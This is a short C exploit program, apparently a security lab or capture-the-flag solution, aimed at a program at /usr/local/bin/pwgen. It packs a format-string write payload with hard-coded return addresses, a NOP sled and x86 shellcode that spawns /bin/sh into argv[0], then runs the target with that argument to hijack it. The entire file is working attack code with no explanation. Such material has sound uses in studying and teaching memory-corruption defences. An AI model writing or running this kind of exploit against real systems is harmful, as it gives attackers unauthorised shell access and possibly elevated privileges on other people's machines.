#include<stdio.h>
#include<stdlib.h>
#include <unistd.h>
#include<string.h>

#define RET "  \x2c\xd5\xbf\xff\x2e\xd5\xbf\xff"

#define STR "%54763x%39$hn%10688x%40$hn"

#define NOP "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

#define SHELL "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

int main(int argc, char const *argv[])
{
	char* name[3];
	char* program = "/usr/local/bin/pwgen";

	name[0] = 
		RET
		STR
		NOP
		SHELL
		;

	name[1] = "-e";
	name[2] = NULL;

	system("mkdir /tmp/pwgen_random");
	
	execve(program, name, NULL);

	system("rm -r /tmp/pwgen_random");
	
	return 0;
}
